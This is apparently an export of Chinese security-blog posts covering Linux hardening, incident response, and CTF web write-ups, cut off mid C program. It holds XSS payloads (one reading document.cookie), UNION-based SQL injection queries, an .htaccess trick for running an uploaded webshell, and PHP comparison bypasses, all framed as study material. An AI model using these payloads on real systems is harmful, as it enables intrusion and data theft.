<h2 id="应用安全设置"><a class="header-anchor" href="#应用安全设置"></a>应用安全设置</h2>
<p><strong>FTP</strong></p>
<p>禁止匿名FTP</p>
<p>vim  /etc/vsftpd/vsftpd.conf</p>
<pre><code>anonymous_enable=NO    #如果存在anonymous_enable则修改,如果不存在则手动增加
</code></pre>
<p><strong>SSH</strong></p>
<ol>
<li>在sshd_config禁止root访问和使用sshv2来让ssh更加安全</li>
</ol>
<p>vim /etc/ssh/sshd_config</p>
<pre><code>PermitRootLogin    no
</code></pre>
<ol start="2">
<li>设置SSH空闲超时退出时间,可降低未授权用户访问其他用户ssh会话的风险</li>
</ol>
<p>编辑/etc/ssh/sshd_config，将ClientAliveInterval 设置为300到900，即5-15分钟，将ClientAliveCountMax设置为0-3之间。</p>
<pre><code>ClientAliveInterval 600
ClientAliveCountMax 2
</code></pre>
<ol start="3">
<li>设置较低的Max AuthTrimes参数将降低SSH服务器被暴力攻击成功的风险</li>
</ol>
<p>在/etc/ssh/sshd_config中取消MaxAuthTries注释符号#，设置最大密码尝试失败次数3-6，建议为4：</p>
<pre><code>MaxAuthTries 4
</code></pre>
<p><strong>TELNET</strong></p>
<p>Telnet使用明文传输数据，存在安全隐患，应该避免使用</p>
<p>执行如下语句，查看telnet服务是否在运行</p>
<pre><code class="language-bash">netstat -na | grep &quot;:23&quot;
</code></pre>
<p>若正在运行则关闭Telnet服务，在/etc/xinetd.d/telnet中进行配置</p>
<pre><code>disable=yes
</code></pre>
<h2 id="网络设置"><a class="header-anchor" href="#网络设置"></a>网络设置</h2>
<p><strong>IPTABLES</strong></p>
<p>根据需求合理配置防火墙</p>
<p>比如将<code>INPUT</code>链默认规则设为<code>DROP</code>，再添加规则将需要开放的端口设置为<code>ACCEPT</code></p>
<pre><code class="language-bash">#将INPUT链默认规则设置为DROP
iptables -P INPUT DROP

#按需添加规则使得开放端口能够接收数据包
#开放SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
#开放80端口
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
#...
</code></pre>
<p><strong>TCP SYN保护机制</strong></p>
<pre><code class="language-bash">echo“1”&gt;/proc/sys/net/ipv4/tcp_syncookies //默认为1，一般不用设置
</code></pre>
<p>表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应&amp;Linux入侵检测</title>
    <url>/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&amp;Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="思路"><a class="header-anchor" href="#思路"></a>思路</h2>
<h3 id="准备"><a class="header-anchor" href="#准备"></a>准备</h3>
<p>准备检测工具和人员</p>
<h3 id="检测与分析"><a class="header-anchor" href="#检测与分析"></a>检测与分析</h3>
<p>紧急事件监测，包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户</p>
<p>甚至还有管理员的报告(收到的邮件和短信)， 从这些数据中判断出受灾面积和攻击者入侵的点</p>
<h3 id="抑制缓解"><a class="header-anchor" href="#抑制缓解"></a>抑制缓解</h3>
<p>首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。</p>
<h3 id="攻击根除"><a class="header-anchor" href="#攻击根除"></a>攻击根除</h3>
<p>紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到正常水平</p>
<h3 id="业务恢复"><a class="header-anchor" href="#业务恢复"></a>业务恢复</h3>
<h3 id="事件跟踪"><a class="header-anchor" href="#事件跟踪"></a>事件跟踪</h3>
<p>根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程</p>
<h2 id="入侵排查"><a class="header-anchor" href="#入侵排查"></a>入侵排查</h2>
<h3 id="Linux常用检查命令"><a class="header-anchor" href="#Linux常用检查命令"></a>Linux常用检查命令</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>last</td>
<td>显示的是目前与过去登入系统的用户相关信息</td>
</tr>
<tr>
<td>lastlog</td>
<td>显示所有用户的登录情况</td>
</tr>
<tr>
<td>lastb</td>
<td>显示用户错误的登录列表</td>
</tr>
<tr>
<td>who</td>
<td>显示的是当前登录的用户</td>
</tr>
<tr>
<td>w</td>
<td>比who显示多一些内容，比如用户当前执行的命令，cpu信息</td>
</tr>
<tr>
<td>history</td>
<td>查看历史命令记录</td>
</tr>
</tbody>
</table>
<h3 id="排查过程"><a class="header-anchor" href="#排查过程"></a>排查过程</h3>
<ul>
<li>
<p>检查账号及登录情况</p>
<p>见这篇文章：<a href="https://dawnyh99.github.io/2021/03/07/%E8%BF%90%E7%BB%B4/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">Linux系统加固</a></p>
</li>
<li>
<p>检查历史命令</p>
</li>
</ul>
<pre><code class="language-bash">cat ~/bash_history &gt;&gt; history.txt
</code></pre>
<ul>
<li>检查网络连接/开放端口</li>
</ul>
<pre><code class="language-bash">netstat -antlp | more

#查看 PID 所对应的进程文件路径
file /proc/$PID/exe
</code></pre>
<ul>
<li>检查异常进程</li>
</ul>
<pre><code class="language-bash">ps aux | grep pid
</code></pre>
<p><img src="/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20210313142418258.png" alt="image-20210313142418258"></p>
<ul>
<li>检查开机启动项</li>
</ul>
<pre><code class="language-bash">ls /etc/init.d/

ls -l /etc/rc3.d/
ls -l /etc/rc5.d/
</code></pre>
<ul>
<li>检查定时任务</li>
</ul>
<pre><code class="language-bash">ls -al /var/spool/cron/* 
cat /etc/crontab
/etc/cron.d/*
/etc/cron.daily/* 
/etc/cron.hourly/* 
/etc/cron.monthly/*
/etc/cron.weekly/

#查看目录下所有文件
more /etc/cron.d/*

/etc/anacrontab
/var/spool/anacron/*
</code></pre>
<ul>
<li>检查服务</li>
</ul>
<pre><code class="language-bash">#CentOS
chkconfig  --list  #查看服务自启动状态，可以看到所有的RPM包安装的服务
#Debian
service --status-all
systemctl list-units
#源码包安装的服务位置
/usr/local/
</code></pre>
<ul>
<li>
<p>检查异常文件</p>
<ul>
<li>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</li>
<li>针对可疑文件可以使用<code>stat</code>查看创建修改时间</li>
<li>发现WebShell、远控木马的创建时间</li>
</ul>
<p>找出同一时间范围内创建的文件？</p>
</li>
</ul>
<pre><code class="language-bash">find ./ -iname &quot;*&quot; -atime 1 -type f 
#找出 ./ 下一天前访问过的文件
</code></pre>
<ul>
<li>检查日志文件</li>
</ul>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th style="text-align:center">日志文件</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">/var/log/cron</td>
<td style="text-align:center">记录系统定时任务相关的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/message</td>
<td style="text-align:center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td>
</tr>
<tr>
<td style="text-align:center">/var/log/syslog</td>
<td style="text-align:center">只记录警告信息，常常是系统出问题的信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/btmp</td>
<td style="text-align:center">记录<strong>错误登录（登陆失败）<strong>日志；使用</strong>lastb</strong>命令查看</td>
</tr>
<tr>
<td style="text-align:center"><strong>/var/log/lastlog</strong></td>
<td style="text-align:center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td>
</tr>
<tr>
<td style="text-align:center"><strong>/var/log/wtmp</strong></td>
<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td>
</tr>
<tr>
<td style="text-align:center"><strong>/var/log/utmp</strong></td>
<td style="text-align:center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td>
</tr>
<tr>
<td style="text-align:center">/var/log/secure</td>
<td style="text-align:center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码</td>
</tr>
<tr>
<td style="text-align:center">/var/log/apache2/error.log</td>
<td style="text-align:center">apache错误日志，如果安装有modsecurity那么其攻击拦截日志也存在这里</td>
</tr>
</tbody>
</table>
<h3 id="Webshell排查"><a class="header-anchor" href="#Webshell排查"></a>Webshell排查</h3>
<p>排查工具：河马 - - <a href="https://www.shellpub.com/">https://www.shellpub.com/</a></p>
<p>除了使用排查工具扫描，还是要手动查看Web目录下的可解析执行文件</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
<h3 id="基本类型"><a class="header-anchor" href="#基本类型"></a>基本类型</h3>
<p>按注入点类型可分为</p>
<ul>
<li>
<p>字符型</p>
</li>
<li>
<p>数字型</p>
</li>
</ul>
<p>按有无回显可分为</p>
<ul>
<li>
<p>报错有回显 —— 报错注入</p>
</li>
<li>
<p>报错无回显</p>
<ul>
<li>sql语句执行成功与否回显不同 —— 布尔盲注</li>
<li>sql语句执行成功与否回显相同（包括都不回显）—— 时间盲注</li>
</ul>
</li>
</ul>
<h3 id="报错注入"><a class="header-anchor" href="#报错注入"></a>报错注入</h3>
<p>报错函数</p>
<pre><code>floor()
extractvalue()
updatexml()
exp()
</code></pre>
<h3 id="order-by注入"><a class="header-anchor" href="#order-by注入"></a>order by注入</h3>
<p>参考https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/</p>
<p>有些排序功能通过sql里的order by语句来实现，我们可以利用这一点，控制order by后面的内容</p>
<p>order by配合union进行盲注：通过排序结果逐字符比较得到结果</p>
<p>order by注入无法通过预编译的方式防御，因为预编译再参数化传值的方式会以字符串的形式传值，而在一些排序功能的order by后需要的是字段名（不加引号），否则无法按照该字段排序。</p>
<h3 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h3>
<ol>
<li>
<p>查询表中的所有记录，但页面只返回1条（前几条）怎么办？</p>
<p>使用字符串连接函数：<code>concat()</code> , <code>concat_ws()</code> , <code>group_concat()</code> 等将多条记录的某个字段合并成一个字符串</p>
<p>eg:</p>
<pre><code class="language-sql">select 1,2,group_concat(name) from security.user;
</code></pre>
<p><img src="/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/image-20200810162953419.png" alt="image-20200810162953419"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>CTF</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2020/08/03/CTF/Web/XSS/</url>
    <content><![CDATA[<h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS"></a>反射型XSS</h2>
<p><strong>payload:</strong></p>
<pre><code class="language-html">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;

&lt;body onload=alert('test1')&gt;&lt;/body&gt;

&lt;b onmouseover=alert('Wufff!')&gt;click me!&lt;/b&gt;

&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt;

&lt;img src=&quot;#&quot; onerror=alert(/跨站/)&gt;&lt;/img&gt;

&lt;iframe/onload=alert(/insight-labs/)&gt;

&lt;div style=&quot;width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;
</code></pre>
<p><strong>一些绕过方法：</strong></p>
<pre><code class="language-html">&lt;!-- 空格过滤：使用左斜线/代替空格 --&gt;
&lt;body/onload=alert(&quot;xss&quot;)&gt;&lt;/body&gt;
</code></pre>
<h2 id="XSS的防御"><a class="header-anchor" href="#XSS的防御"></a>XSS的防御</h2>
<h3 id="过滤输入"><a class="header-anchor" href="#过滤输入"></a>过滤输入</h3>
<p>对输入和URL参数进行过滤(白名单和黑名单)</p>
<h3 id="转义输出"><a class="header-anchor" href="#转义输出"></a>转义输出</h3>
<p><strong>1&gt;</strong> 作为body文本输出，作为html标签的属性输出：</p>
<p>比如：</p>
<pre><code class="language-html">&lt;span&gt;${username}&lt;/span&gt;,

&lt;p&gt;&lt;c:out value=&quot;${username}&quot;&gt;&lt;/c:out&gt;&lt;/p&gt;

&lt;input type=&quot;text&quot; value=&quot;${username}&quot; /&gt;
</code></pre>
<p>此时的转义规则如下：</p>
<p>&lt; 转成 <code>&amp;lt;</code></p>
<p>&gt; 转成 <code>&amp;gt;</code></p>
<p>&amp; 转成 <code>&amp;amp;</code></p>
<p>&quot; 转成 <code>&amp;quot;</code></p>
<p>’ 转成 <code>&amp;#39;</code></p>
<p><strong>2&gt;</strong> javascript事件</p>
<pre><code class="language-javascript">&lt;input type=&quot;button&quot; onclick='go_to_url(&quot;${myUrl}&quot;);' /&gt;
</code></pre>
<p>除了上面的那些转义之外，还要附加上下面的转义：</p>
<p>\ 转成<code>\\</code></p>
<p>/ 转成 <code>\/</code></p>
<p>; 转成 <code>；</code>(全角分号)</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>CTF</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a class="header-anchor" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020] 你传你🐎呢</h2>
<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200804123829115.png" alt="image-20200804123829115"></p>
<p>尝试上传一些文件，发现只有.jpg 和 .htaccess 后缀的文件能够上传，<code>Content-Type</code>需要修改为 <code>image/jpeg</code></p>
<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1988809-20200401194611819-1412530212.png" alt="img"></p>
<p><code>.htaccess</code>文件的利用：<a href="https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/">https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/</a></p>
<p>通过上传一个<code>.htaccess</code>,能够将后面上传的jpg文件解析为php，这样就可以使用蚁剑连接</p>
<pre><code>&lt;FilesMatch &quot;1&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>这里代码的意思是只要文件名中包含<code>1</code>，那么就当成php处理。</p>
<p>然后我们再将一句话木马文件名修改为<code>1.jpg</code>，上传，即可成功访问。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>CTF</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2020/08/23/CTF/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="PHP函数漏洞及其绕过姿势"><a class="header-anchor" href="#PHP函数漏洞及其绕过姿势"></a>PHP函数漏洞及其绕过姿势</h2>
<h3 id="MD5"><a class="header-anchor" href="#MD5"></a>MD5</h3>
<pre><code>$a[]=1;
$b[]=2;
md5($a)===md5($b);	//true
</code></pre>
<hr>
<p>md5计算结果为<code>0e...</code>的，会被当做0处理</p>
<p>以下这些字符串，md5哈希之后都是0e开头的：</p>
<pre><code>QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

//比较特殊的一个，加密前后进行比较的话会判断为相等
0e215962017
0e291242476940776845150308577824
</code></pre>
<h3 id="intval"><a class="header-anchor" href="#intval"></a>intval</h3>
<p>得到一个数的整型值。</p>
<pre><code class="language-php">&lt;?php
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34
echo intval('042');                   // 42
echo intval(1e10);                    // 1410065408
echo intval('1e10');                  // 1
echo intval(0x1A);                    // 26
echo intval('0x1A');				  // 0
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
?&gt;
</code></pre>
<p>比如在以下代码中</p>
<pre><code class="language-php">$a = $_GET['a'];
if(intval($a)&lt;2020 &amp;&amp; intval($a+1)&gt;2020)
	echo $flag;
</code></pre>
<p>即可利用 intval 函数对字符串型16进制数的处理漏洞进行绕过</p>
<pre><code>?a=0x10ff	//在进行+1运算时，$a会被转换为数值型进行运算.
</code></pre>
<h3 id="is-numeric"><a class="header-anchor" href="#is-numeric"></a>is_numeric</h3>
<p>PHP的is_numeric()函数会判断参数是否为数字或者数字字符串</p>
<p>绕过方法：在要输入的数字后加上<code>%20</code>（空格），或者在数字前或后加上<code>%00</code>（终止符）</p>
<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand"></a>mt_rand</h3>
<p>生成伪随机数，利用<code>php_mt_seed</code>可以通过已知随机数数列爆破出随机数种子</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩包破解</title>
    <url>/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    <content><![CDATA[<h2 id="ZIP明文攻击"><a class="header-anchor" href="#ZIP明文攻击"></a>ZIP明文攻击</h2>
<h3 id="CISCN-2017-WarmUp"><a class="header-anchor" href="#CISCN-2017-WarmUp"></a>[CISCN 2017] WarmUp</h3>
<p>给我们的是一个加密的压缩包以及一个 readme.txt</p>
<p>而压缩包中也存在该文件</p>
<p>考虑ZIP明文攻击</p>
<ol>
<li>
<p>将 readme.txt 压缩为 readme.zip</p>
</li>
<li>
<p>使用 bandzip 打开，查看CRC校验码</p>
</li>
<li>
<p>发现 readme.zip 与加密压缩包中的 readme.txt 校验码相同，说明可以使用ZIP明文攻击</p>
</li>
<li>
<p>使用<code>ARCHPR</code>对加密压缩包进行破解即可</p>
<p><img src="/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/image-20200818122011977.png" alt="image-20200818122011977"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
<p>简单的文件包含题。</p>
<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
<p>在phpinfo中可以发现</p>
<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
<p>尝试发现确实可行</p>
<p>现在我们就可以任意执行php代码了</p>
<p>对当前文件夹进行目录遍历</p>
<pre><code class="language-php">&lt;?php

    function myScanDir($dir)
    {
        $file_arr = scandir($dir);
        $new_arr = [];
        foreach($file_arr as $item){

            if($item!=&quot;..&quot; &amp;&amp; $item !=&quot;.&quot;){

                $new_arr[] = $item;
            }
        }
        return $new_arr;

    }

    $dir = myScanDir(&quot;./&quot;);

    var_dump($dir); 

?&gt;
</code></pre>
<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
<p>输出文件内容即可得到flag</p>
<pre><code class="language-php">show_source(&quot;./dle345aae.php&quot;);
</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>CTF</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF校赛Web</title>
    <url>/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/</url>
    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
<p>关注公众号，回复“一句话”即可</p>
<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
<p>列换位密码，用密码学实验的脚本跑一下</p>
<pre><code class="language-python">secret=&quot;&quot;
secret=input(&quot;ciphertext:&quot;)
length=len(secret)
print(length)
answer=&quot;&quot;
for n in range(2,26):
    k=length
    while k%n!=0:
        k=k+1
    m=k//n
    answer=&quot;&quot;
    for i in range(m):
        for j in range(i,length,m):
            answer+=secret[j]
        if ' is ' in answer :
            print(&quot;############&quot;)
            print(answer)
</code></pre>
<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
<p><strong>flag值：（没记。。）</strong></p>
<p>一个数字型SQL回显注入</p>
<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222156910.png" alt="image-20200529222156910"></p>
<p>首先猜出字段数为4</p>
<p>联合查询得到数据库名</p>
<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
<p>数据表名</p>
<pre><code>union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema='easy_sql_injection'
</code></pre>
<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
<p>列名</p>
<pre><code>union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='Notice'
</code></pre>
<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
<p>读取数据</p>
<pre><code>union select group_concat(flag),2,3,4 from Notice
</code></pre>
<p>得到flag</p>
<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
<p><strong>flag值：（没记。。）</strong></p>
<pre><code class="language-php">&lt;?php
error_reporting(0);
include_once &quot;flag.php&quot;;
show_source(__FILE__);

session_start();


if(!isset($_POST['key'])) {
    die(&quot;not allow!&quot;);
}

if($_POST['key'] != $_SESSION['key']) {
    die(&quot;Wrong key!&quot;);
}

if(isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
    if($_GET['username'] == $_GET['password']) {
        die(&quot;Your password can not be your username!&quot;);
    }
    if(md5($_GET['username']) === md5($_GET['password'])) {
        echo $flag;
    }
}
</code></pre>
<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>密码算法</title>
    <url>/2021/08/09/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="对称加密"><a class="header-anchor" href="#对称加密"></a>对称加密</h2>
<ul>
<li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合；</li>
<li>3DES（Triple DES）：是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高；</li>
<li>AES（Advanced Encryption Standard）：高级加密标准，是下一代的加密算法标准，速度快，安全级别高，支持128、192、256、512位密钥的加密；</li>
<li>RC2：分组加密，输入输出均为64位</li>
<li>RC4：流密码</li>
<li>Blowfish：区块加密算法</li>
</ul>
<h2 id="非对称加密"><a class="header-anchor" href="#非对称加密"></a>非对称加密</h2>
<ul>
<li>
<p>RSA：基于大数分解难题</p>
<ul>
<li>随意选择两个大的质数p和q，p不等于q，计算N = pq.</li>
<li>根据欧拉函数，求得r=φ(N)=φ§φ(q)=(p-1)(q-1)。</li>
<li>选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质）</li>
<li>将p和q的记录销毁。</li>
</ul>
<p>其中(N，e)是公钥，(N，d)是私钥。</p>
<p>参考：<a href="https://blog.csdn.net/gao131360144/article/details/79966094">https://blog.csdn.net/gao131360144/article/details/79966094</a></p>
</li>
<li>
<p>DSA：基于整数有限域离散对数难题</p>
</li>
<li>
<p>ECC：椭圆曲线</p>
</li>
</ul>
]]></content>
      <categories>
        <category>专业课</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛2020WP</title>
    <url>/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/</url>
    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
<h3 id="签到"><a class="header-anchor" href="#签到"></a>签到</h3>
<p>助力即可得到flag</p>
<h3 id="the-best-ctf-game"><a class="header-anchor" href="#the-best-ctf-game"></a>the_best_ctf_game</h3>
<p>解压得到二进制文件:flag</p>
<p>使用winhex打开</p>
<p>观察到</p>
<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820142658465.png" alt="image-20200820142658465"></p>
<p>即flag的值</p>
<h3 id="电脑被黑"><a class="header-anchor" href="#电脑被黑"></a>电脑被黑</h3>
<p>解压缩包得到disk_dump文件</p>
<p>使用file 命令查看信息</p>
<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201008231.png" alt="image-20200820201008231"></p>
<p>可以看到是ext3的文件系统</p>
<p>挂载到 test文件夹下</p>
<pre><code>mount ./disk_dump ./test/
</code></pre>
<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201521587.png" alt="image-20200820201521587"></p>
<p>查看???.png，提示flag已被删除</p>
<p>使用extundelete恢复被删除的文件</p>
<pre><code>extundelete ./disk_dump --restore-all
</code></pre>
<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201902816.png" alt="image-20200820201902816"></p>
<p>得到flag.txt，但打开后是乱码</p>
<p>返回test/misc01文件夹下，看到可执行文件demo</p>
<p>使用strings命令查看</p>
<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820202222131.png" alt="image-20200820202222131"></p>
<p>猜测demo对flag.txt进行了处理</p>
<p>使用ida反编译查看其伪源码</p>
<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/20200820202837.png" alt="image-20200820202837"></p>
<p>编写代码对flag文件进行解码</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    FILE *fileOld = fopen(&quot;D:\\flag.txt&quot;,&quot;rb&quot;);
    FILE *fileNew = fopen(&quot;D:\\flagNew.txt&quot;,&quot;rb+&quot;);
    char v1,v4,v5;
    v4 = 34;
    v5 = 0;
    while(1)
    {
        v1 = fgetc(fileOld);
        if( v1 == -1 )
            break;
